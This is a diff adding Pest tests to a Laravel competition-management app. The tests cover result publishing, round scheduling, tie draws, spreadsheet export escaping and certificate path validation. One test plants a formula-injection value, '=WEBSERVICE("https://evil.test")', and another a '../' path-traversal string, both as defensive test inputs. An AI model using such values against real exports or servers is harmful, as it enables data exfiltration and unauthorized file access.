@@ -3,6 +3,7 @@
 use App\Actions\Competitions\ImportStudentQuestions;
 use App\Actions\Competitions\IssueCompetitionCertificates;
 use App\Actions\Competitions\PublishRoundResults;
+use App\Actions\Competitions\QualifyAttempts;
 use App\Actions\Competitions\RevealStudentIdentity;
 use App\Actions\Competitions\RunTieDraw;
 use App\Actions\Competitions\SaveCompetition;
@@ -19,6 +20,7 @@ use App\Filament\Resources\CompetitionRegions\CompetitionRegionResource;
 use App\Filament\Resources\Competitions\CompetitionResource;
 use App\Filament\Resources\Competitions\Pages\EditCompetition;
 use App\Filament\Resources\Competitions\Pages\ViewCompetition;
+use App\Filament\Resources\Competitions\RelationManagers\DrawsRelationManager;
 use App\Filament\Resources\Competitions\RelationManagers\FieldsRelationManager;
 use App\Filament\Resources\Competitions\RelationManagers\PassagesRelationManager;
 use App\Filament\Resources\Competitions\RelationManagers\QuestionBankRelationManager;
@@ -381,6 +383,10 @@ it('qualifies submitted attempts for the next round from the results', function 
     $attempt = submittedWithScore(1, 5);
     $this->actingAs($this->manager);
 
+    // قبل النشر يُرفض، لأن التأهل يكشف النتيجة
+    expect(fn () => app(QualifyAttempts::class)->handle($this->manager, $this->round, [$attempt->id]))->toThrow(ValidationException::class);
+    $this->round->forceFill(['results_published_at' => now()])->save();
+
     Livewire::test(ResultsRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => EditCompetition::class])
         ->selectTableRecords([$attempt->id])
         ->callAction(TestAction::make('qualify')->table()->bulk())
@@ -388,4 +394,46 @@ it('qualifies submitted attempts for the next round from the results', function 
 
     expect($attempt->fresh()->qualified_at)->not->toBeNull()
         ->and(Activity::query()->where('event', 'attempts_qualified')->exists())->toBeTrue();
+});
+
+it('writes spreadsheet cells that start like formulas as plain text', function () {
+    $field = $this->competition->fields()->create(['label' => 'المدرسة', 'type' => 'text', 'is_required' => false, 'sort_order' => 1]);
+    studentQuestion($this->round);
+    $student = registeredStudent($this->competition, 8, ['fields' => [$field->id => '=WEBSERVICE("https://evil.test")']]);
+    $attempt = app(StartAttempt::class)->handle($student, $this->round);
+    app(SubmitAttempt::class)->handle($student, $attempt);
+
+    $rows = readXlsx(TestResponse::fromBaseResponse(StudentResultsSheet::download($this->director, $this->competition, $this->competition->attempts()->getQuery()))->streamedContent());
+
+    expect(implode(' ', $rows[1]))->toContain("'=WEBSERVICE");
+});
+
+it('does not let a round end move earlier once students have started', function () {
+    studentQuestion($this->round);
+    app(StartAttempt::class)->handle(registeredStudent($this->competition), $this->round);
+    $data = ['name' => $this->round->name, 'starts_at' => $this->round->starts_at, 'ends_at' => $this->round->ends_at->copy()->subHour(), 'question_count' => 10, 'duration_minutes' => 30];
+
+    expect(fn () => app(SaveCompetitionRound::class)->handle($this->manager, $this->competition, $this->round, $data))->toThrow(ValidationException::class);
+});
+
+it('rejects a certificate background path outside its folder', function () {
+    expect(fn () => app(SaveCompetition::class)->handle($this->manager, $this->competition, [
+        'title' => $this->competition->title, 'slug' => 'students', 'opens_at' => $this->competition->opens_at, 'closes_at' => $this->competition->closes_at,
+        'certificate_background' => 'competition-certificate-templates/../competition-certificates/x.png',
+    ]))->toThrow(ValidationException::class);
+});
+
+it('keeps a tie draw out of the void action and out of the competition schedule lock', function () {
+    studentQuestion($this->round);
+    collect([1, 2, 3])->each(fn (int $serial) => submittedWithScore($serial, 7));
+    $this->travel(4)->hours();
+    [$draw] = app(RunTieDraw::class)->handle($this->manager, $this->round, null, 2);
+
+    expect($this->competition->fresh()->scheduleLocked())->toBeFalse();
+
+    $this->actingAs(userWithRole(RoleName::SuperAdmin));
+    Livewire::test(DrawsRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => ViewCompetition::class])
+        ->assertActionHidden(TestAction::make('void')->table($draw));
+
+    $this->artisan('ejaz:verify-draw', ['uuid' => $draw->uuid])->assertSuccessful()->expectsOutputToContain('كما كانت عند السحب');
 });
